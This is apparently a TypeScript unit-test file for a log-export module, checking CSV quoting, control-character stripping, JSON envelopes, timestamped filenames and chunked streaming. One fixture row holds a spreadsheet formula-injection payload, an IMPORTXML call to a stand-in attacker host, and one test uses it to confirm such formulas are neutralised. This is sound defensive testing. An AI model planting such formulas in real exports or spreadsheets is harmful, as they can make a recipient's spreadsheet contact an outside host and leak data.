import assert from 'node:assert/strict';
import test from 'node:test';
import {
  EXPORT_MIME_TYPES,
  buildExportFilename,
  buildLogExport,
  downloadLogExport,
  downloadLogExportAsync,
  escapeCsvCell,
  planLogExport,
  sanitizeExportText,
  serializeLogCsv,
  serializeLogJson,
  type ExportColumn,
  type LogExportOptions,
} from './exportSerialization';

interface LogRow {
  id: string;
  note: string;
  amount: number;
}

const columns: ExportColumn<LogRow>[] = [
  { header: 'ID', value: (row) => row.id },
  { header: 'Note', value: (row) => row.note },
  { header: 'Amount', value: (row) => row.amount },
];

const rows: LogRow[] = [
  { id: 'log_1', note: 'Plain note', amount: 10 },
  { id: 'log_2', note: 'Commas, "quotes"\nand newlines', amount: -5 },
  { id: 'log_3', note: '=IMPORTXML("https://evil.example","//a")', amount: 0 },
];

test('escapeCsvCell applies RFC 4180 quoting', () => {
  assert.equal(escapeCsvCell('Plain'), 'Plain');
  assert.equal(escapeCsvCell('a,b'), '"a,b"');
  assert.equal(escapeCsvCell('say "hi"'), '"say ""hi"""');
  assert.equal(escapeCsvCell('line1\nline2'), '"line1\nline2"');
  assert.equal(escapeCsvCell(''), '');
  assert.equal(escapeCsvCell(null), '');
  assert.equal(escapeCsvCell(undefined), '');
});

test('escapeCsvCell neutralises spreadsheet formula injection', () => {
  assert.equal(escapeCsvCell('=SUM(A1:A9)'), '"\'=SUM(A1:A9)"');
  assert.equal(escapeCsvCell('@SUM(1)'), '"\'@SUM(1)"');
  assert.equal(escapeCsvCell('+1-800-FLOWERS'), '"\'+1-800-FLOWERS"');
  assert.equal(escapeCsvCell('-EVIL()'), '"\'-EVIL()"');
  // Numeric literals stay numeric — never neutralised.
  assert.equal(escapeCsvCell(-41000), '-41000');
  assert.equal(escapeCsvCell(41000), '41000');
  assert.equal(escapeCsvCell(3.14), '3.14');
});

test('sanitizeExportText strips control characters but keeps tabs and newlines', () => {
  assert.equal(sanitizeExportText('a\u0000b\u0007c\td\ne'), 'abc\td\ne');
  assert.equal(escapeCsvCell('bad\u0000value'), 'badvalue');
  assert.equal(escapeCsvCell({ a: 1 }), '"{""a"":1}"');
});

test('serializeLogCsv writes a header row then one CRLF row per record', () => {
  const csv = serializeLogCsv(rows, columns);
  const lines = csv.split('\r\n');
  assert.equal(lines[0], 'ID,Note,Amount');
  assert.equal(lines.length, rows.length + 2); // trailing CRLF leaves a final empty line
  assert.ok(csv.includes('"Commas, ""quotes""\nand newlines"'));
  assert.ok(csv.includes('"\'=IMPORTXML(""https://evil.example"",""//a"")"'));
  assert.ok(csv.includes(',-5\r\n'));
});

test('serializeLogCsv handles an empty dataset as a header-only file', () => {
  assert.equal(serializeLogCsv([], columns), 'ID,Note,Amount\r\n');
});

test('serializeLogJson wraps records in a self-describing envelope', () => {
  const json = serializeLogJson(rows, {
    exportedAt: '2026-11-22T00:00:00.000Z',
    recordsKey: 'entries',
    metadata: { source: 'unit-test' },
  });
  const parsed = JSON.parse(json) as {
    exportedAt: string;
    source: string;
    count: number;
    entries: LogRow[];
  };
  assert.equal(parsed.exportedAt, '2026-11-22T00:00:00.000Z');
  assert.equal(parsed.source, 'unit-test');
  assert.equal(parsed.count, rows.length);
  assert.equal(parsed.entries.length, rows.length);
  assert.deepEqual(parsed.entries[0], rows[0]);
});

test('serializeLogJson defaults to a records key and round-trips empty arrays', () => {
  const parsed = JSON.parse(serializeLogJson([], {})) as {
    count: number;
    records: unknown[];
  };
  assert.equal(parsed.count, 0);
  assert.deepEqual(parsed.records, []);
});

test('buildExportFilename slugifies the scope and stamps a descriptive timestamp', () => {
  const date = new Date('2026-11-22T13:30:45.123Z');
  assert.equal(
    buildExportFilename('Financial Audit Log', 'csv', date),
    'astroid-financial-audit-log-2026-11-22T13-30-45-123Z.csv',
  );
  assert.equal(
    buildExportFilename('!!', 'json', date),
    'astroid-export-2026-11-22T13-30-45-123Z.json',
  );
});

test('export MIME types declare UTF-8 explicitly', () => {
  assert.equal(EXPORT_MIME_TYPES.csv, 'text/csv;charset=utf-8');
  assert.equal(EXPORT_MIME_TYPES.json, 'application/json;charset=utf-8');
});

test('planLogExport produces a lazy CSV stream and a timestamped filename', () => {
  const plan = planLogExport({
    scope: 'audit-log',
    format: 'csv',
    rows,
    columns,
    exportedAt: new Date('2026-11-22T00:00:00.000Z'),
  });
  assert.equal(plan.filename, 'astroid-audit-log-2026-11-22T00-00-00-000Z.csv');
  assert.equal(plan.mimeType, EXPORT_MIME_TYPES.csv);
  const chunks = Array.from(plan.stream());
  assert.equal(chunks.length, rows.length + 1);
  assert.equal(chunks.join(''), serializeLogCsv(rows, columns));
});

test('planLogExport rejects CSV exports without columns', () => {
  const malformed = {
    scope: 'x',
    format: 'csv',
    rows: [],
  } as unknown as LogExportOptions<LogRow>;
  assert.throws(() => planLogExport(malformed), /at least one column/);
});

test('buildLogExport returns chunks ready for a Blob', () => {
  const payload = buildLogExport({
    scope: 'audit-log',
    format: 'json',
    rows,
    exportedAt: new Date('2026-11-22T00:00:00.000Z'),
  });
  assert.equal(payload.filename, 'astroid-audit-log-2026-11-22T00-00-00-000Z.json');
  assert.equal(payload.mimeType, EXPORT_MIME_TYPES.json);
  const parsed = JSON.parse(payload.chunks.join('')) as { count: number };
  assert.equal(parsed.count, rows.length);
});

test('large exports are chunked row-by-row instead of one giant string', () => {
  const large = Array.from({ length: 5000 }, (_, index) => ({
    id: `log_${index}`,
    note: `note ${index}`,
    amount: index,
  }));
  const plan = planLogExport({
    scope: 'audit-log',
    format: 'csv',
    rows: large,
    columns,
  });
  const chunks = Array.from(plan.stream());
  assert.equal(chunks.length, large.length + 1);
  assert.ok(chunks[0]?.includes('ID,Note,Amount'));
});

test('downloads are no-ops outside the browser', async () => {
  assert.equal(typeof window, 'undefined');
  const payload = buildLogExport({ scope: 'audit-log', format: 'csv', rows, columns });
  assert.doesNotThrow(() => downloadLogExport(payload));
  await assert.doesNotReject(() =>
    downloadLogExportAsync(
      planLogExport({ scope: 'audit-log', format: 'csv', rows, columns }),
    ),
  );
});
